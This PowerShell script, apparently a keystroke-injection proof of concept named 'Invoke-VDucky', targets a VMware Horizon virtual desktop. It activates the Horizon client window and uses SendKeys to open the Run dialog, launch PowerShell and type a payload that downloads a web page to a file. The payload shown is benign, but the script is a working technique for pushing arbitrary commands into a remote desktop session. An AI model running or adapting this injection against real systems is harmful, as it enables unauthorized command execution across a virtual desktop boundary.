function Invoke-VDucky {iw
     $Starter = 'powershell.exe' 
     $payload1 = 'iwr https://github.com -outfile $home\test.html'
     $Delay = 500
    
    # Activate Horizon Window
    $viewProc = Get-Process -Name 'vmware-view'
    Write-Host "Window Title: " $viewProc.MainWindowTitle
    [void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic")
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
    [Microsoft.VisualBasic.Interaction]::AppActivate($viewProc.MainWindowTitle)

    # Horizon seems to require an initial keypress to fully activate/capture input
    [System.Windows.Forms.SendKeys]::SendWait('1')
    Start-Sleep -Seconds 1

    # https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.sendkeys.send

    # Open Run Context without scancodes
     [System.Windows.Forms.SendKeys]::SendWait('^{ESC}')
    
    Start-Sleep -Milliseconds $Delay
    [System.Windows.Forms.SendKeys]::SendWait('run~')
    Start-Sleep -Milliseconds $Delay
    # Send payload
    [System.Windows.Forms.SendKeys]::SendWait($starter)
    [System.Windows.Forms.SendKeys]::SendWait('~')
    Start-Sleep -Seconds 5
    [System.Windows.Forms.SendKeys]::SendWait($payload1)
    Start-Sleep -Milliseconds $Delay
    [System.Windows.Forms.SendKeys]::SendWait('~')
}

Invoke-VDucky
